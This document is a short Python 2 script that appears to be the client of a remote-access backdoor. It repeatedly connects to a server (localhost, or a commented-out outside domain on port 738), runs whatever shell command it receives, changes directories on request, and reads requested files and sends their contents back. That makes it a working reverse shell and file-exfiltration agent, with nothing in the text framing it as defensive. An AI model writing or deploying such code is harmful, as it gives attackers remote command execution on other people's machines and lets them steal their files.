import socket
import sys
from os import system,chdir
import commands
from time import sleep
from message import message

HOST,PORT = "localhost", 738
#HOST,PORT = "batterystapler.com", 738

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
get = message("get", "").getMessage()
data = get
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        sock.sendall(data + "\n")
        received = sock.recv(1024).strip()
        command = received.split("\n")[0]
        if command == "\0":
            sleep(.1)
            data = get
        else:
            print command 
            first = command.split(" ")[0]
            if first == "cd":
                try:
                    chdir(" ".join(command.split(" ")[1:]))
                except OSError as ose:
                    print ose
                finally:
                    command = "pwd"
                    result = commands.getoutput(command)
                    mes = message(command, result)
                    data = mes.getMessage()
            elif first == "getfile":
                print "Received getfile"
                filename = command.split(" ")[1]
                try:
                    with open(filename, 'r') as infile:
                        result = infile.read()
                except: 
                    result = ""
                mes = message(command, result)
                data = mes.getMessage()
            else:
                result = commands.getoutput(command)
                mes = message(command, result)
                data = mes.getMessage()
            print data
    except socket.error as se:
        print se
        sleep(1)
    finally:
        sock.close()
        sleep(.1)
